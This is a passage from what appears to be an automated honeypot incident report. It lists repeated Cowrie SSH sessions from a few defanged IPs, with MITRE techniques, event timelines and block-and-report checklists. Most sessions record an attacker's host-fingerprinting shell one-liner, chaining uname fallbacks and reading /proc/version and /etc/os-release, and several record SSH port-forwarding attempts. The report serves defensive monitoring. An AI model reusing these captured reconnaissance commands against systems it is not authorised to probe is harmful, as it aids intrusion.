| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:47:00` | `cowrie.session.connect` |
| `2026-08-25 05:47:00` | `cowrie.client.version` |
| `2026-08-25 05:47:00` | `cowrie.client.kex` |
| `2026-08-25 05:47:02` | `cowrie.login.success` |
| `2026-08-25 05:47:03` | `cowrie.session.params` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.success` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:03` | `cowrie.command.input` |
| `2026-08-25 05:47:04` | `cowrie.log.closed` |
| `2026-08-25 05:47:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dc40ac233f4

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:49 |
| **Last Seen** | 2026-08-25 05:49 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:49:03` | `cowrie.session.connect` |
| `2026-08-25 05:49:03` | `cowrie.client.version` |
| `2026-08-25 05:49:03` | `cowrie.client.kex` |
| `2026-08-25 05:49:05` | `cowrie.login.success` |
| `2026-08-25 05:49:06` | `cowrie.session.params` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.success` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:06` | `cowrie.command.input` |
| `2026-08-25 05:49:07` | `cowrie.log.closed` |
| `2026-08-25 05:49:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b62d167b6a5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:51 |
| **Last Seen** | 2026-08-25 05:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:51:08` | `cowrie.session.connect` |
| `2026-08-25 05:51:08` | `cowrie.client.version` |
| `2026-08-25 05:51:08` | `cowrie.client.kex` |
| `2026-08-25 05:51:10` | `cowrie.login.success` |
| `2026-08-25 05:51:11` | `cowrie.session.params` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.success` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:11` | `cowrie.command.input` |
| `2026-08-25 05:51:12` | `cowrie.log.closed` |
| `2026-08-25 05:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03b6d22167b8

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:53 |
| **Last Seen** | 2026-08-25 05:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:53:19` | `cowrie.session.connect` |
| `2026-08-25 05:53:19` | `cowrie.client.version` |
| `2026-08-25 05:53:19` | `cowrie.client.kex` |
| `2026-08-25 05:53:20` | `cowrie.login.success` |
| `2026-08-25 05:53:22` | `cowrie.session.params` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.success` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:22` | `cowrie.command.input` |
| `2026-08-25 05:53:23` | `cowrie.log.closed` |
| `2026-08-25 05:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54f3353137b2

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:54 |
| **Last Seen** | 2026-08-25 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:54:49` | `cowrie.session.connect` |
| `2026-08-25 05:54:49` | `cowrie.client.version` |
| `2026-08-25 05:54:49` | `cowrie.client.kex` |
| `2026-08-25 05:54:50` | `cowrie.login.success` |
| `2026-08-25 05:54:50` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:54:50` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:54:50` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77cc383771df

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 05:54 |
| **Last Seen** | 2026-08-25 05:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:54:55` | `cowrie.session.connect` |
| `2026-08-25 05:54:55` | `cowrie.client.version` |
| `2026-08-25 05:54:55` | `cowrie.client.kex` |
| `2026-08-25 05:54:56` | `cowrie.login.success` |
| `2026-08-25 05:54:56` | `cowrie.direct-tcpip.request` |
| `2026-08-25 05:54:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 05:54:56` | `cowrie.direct-tcpip.data` |
| `2026-08-25 05:54:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc99cf32d9dc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:55 |
| **Last Seen** | 2026-08-25 05:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:55:34` | `cowrie.session.connect` |
| `2026-08-25 05:55:34` | `cowrie.client.version` |
| `2026-08-25 05:55:34` | `cowrie.client.kex` |
| `2026-08-25 05:55:36` | `cowrie.login.success` |
| `2026-08-25 05:55:37` | `cowrie.session.params` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.success` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:37` | `cowrie.command.input` |
| `2026-08-25 05:55:38` | `cowrie.log.closed` |
| `2026-08-25 05:55:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e5cb4a26823

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:57 |
| **Last Seen** | 2026-08-25 05:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:57:41` | `cowrie.session.connect` |
| `2026-08-25 05:57:42` | `cowrie.client.version` |
| `2026-08-25 05:57:42` | `cowrie.client.kex` |
| `2026-08-25 05:57:43` | `cowrie.login.success` |
| `2026-08-25 05:57:45` | `cowrie.session.params` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.success` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.command.input` |
| `2026-08-25 05:57:45` | `cowrie.log.closed` |
| `2026-08-25 05:57:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1af8c81df341

| Field | Detail |
|---|---|
| **Source IP** | `34.79.176[.]96` |
| **First Seen** | 2026-08-25 05:58 |
| **Last Seen** | 2026-08-25 05:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:58:58` | `cowrie.session.connect` |
| `2026-08-25 05:58:58` | `cowrie.login.success` |
| `2026-08-25 05:58:58` | `cowrie.session.params` |
| `2026-08-25 05:58:58` | `cowrie.command.input` |
| `2026-08-25 05:58:58` | `cowrie.command.input` |
| `2026-08-25 05:58:58` | `cowrie.command.failed` |
| `2026-08-25 05:58:58` | `cowrie.command.input` |
| `2026-08-25 05:58:58` | `cowrie.log.closed` |
| `2026-08-25 05:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.176[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.79.176[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b75b5b51fe9b

| Field | Detail |
|---|---|
| **Source IP** | `34.79.176[.]96` |
| **First Seen** | 2026-08-25 05:59 |
| **Last Seen** | 2026-08-25 05:59 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:59:11` | `cowrie.session.connect` |
| `2026-08-25 05:59:11` | `cowrie.login.success` |
| `2026-08-25 05:59:12` | `cowrie.session.params` |
| `2026-08-25 05:59:12` | `cowrie.command.input` |
| `2026-08-25 05:59:12` | `cowrie.command.failed` |
| `2026-08-25 05:59:26` | `cowrie.log.closed` |
| `2026-08-25 05:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.176[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.79.176[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d75d6b07bf4

| Field | Detail |
|---|---|
| **Source IP** | `34.79.176[.]96` |
| **First Seen** | 2026-08-25 05:59 |
| **Last Seen** | 2026-08-25 05:59 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:59:13` | `cowrie.session.connect` |
| `2026-08-25 05:59:13` | `cowrie.login.success` |
| `2026-08-25 05:59:14` | `cowrie.session.params` |
| `2026-08-25 05:59:14` | `cowrie.command.input` |
| `2026-08-25 05:59:26` | `cowrie.log.closed` |
| `2026-08-25 05:59:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.79.176[.]96` to AbuseIPDB if not already reported
- [ ] Block `34.79.176[.]96` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ebd1561b707

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 05:59 |
| **Last Seen** | 2026-08-25 05:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 05:59:46` | `cowrie.session.connect` |
| `2026-08-25 05:59:46` | `cowrie.client.version` |
| `2026-08-25 05:59:46` | `cowrie.client.kex` |
| `2026-08-25 05:59:48` | `cowrie.login.success` |
| `2026-08-25 05:59:49` | `cowrie.session.params` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.success` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:49` | `cowrie.command.input` |
| `2026-08-25 05:59:50` | `cowrie.log.closed` |
| `2026-08-25 05:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b972f433cc5e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 06:01 |
| **Last Seen** | 2026-08-25 06:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:01:54` | `cowrie.session.connect` |
| `2026-08-25 06:01:54` | `cowrie.client.version` |
| `2026-08-25 06:01:54` | `cowrie.client.kex` |
| `2026-08-25 06:01:56` | `cowrie.login.success` |
| `2026-08-25 06:01:58` | `cowrie.session.params` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.success` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.command.input` |
| `2026-08-25 06:01:58` | `cowrie.log.closed` |
| `2026-08-25 06:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7428fabec5ba

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]55` |
| **First Seen** | 2026-08-25 06:04 |
| **Last Seen** | 2026-08-25 06:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:04:00` | `cowrie.session.connect` |
| `2026-08-25 06:04:00` | `cowrie.client.version` |
| `2026-08-25 06:04:00` | `cowrie.client.kex` |
| `2026-08-25 06:04:02` | `cowrie.login.success` |
| `2026-08-25 06:04:04` | `cowrie.session.params` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.success` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.command.input` |
| `2026-08-25 06:04:04` | `cowrie.log.closed` |
| `2026-08-25 06:04:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]55` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe7750b98f9f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:04 |
| **Last Seen** | 2026-08-25 06:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:04:21` | `cowrie.session.connect` |
| `2026-08-25 06:04:21` | `cowrie.client.version` |
| `2026-08-25 06:04:22` | `cowrie.client.kex` |
| `2026-08-25 06:04:23` | `cowrie.login.success` |
| `2026-08-25 06:04:23` | `cowrie.direct-tcpip.request` |
| `2026-08-25 06:04:23` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-25 06:04:23` | `cowrie.direct-tcpip.data` |
| `2026-08-25 06:04:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-709b85e51853

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-25 06:04 |
| **Last Seen** | 2026-08-25 06:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-25 06:04:26` | `cowrie.session.connect` |
| `2026-08-25 06:04:26` | `cowrie.client.version` |
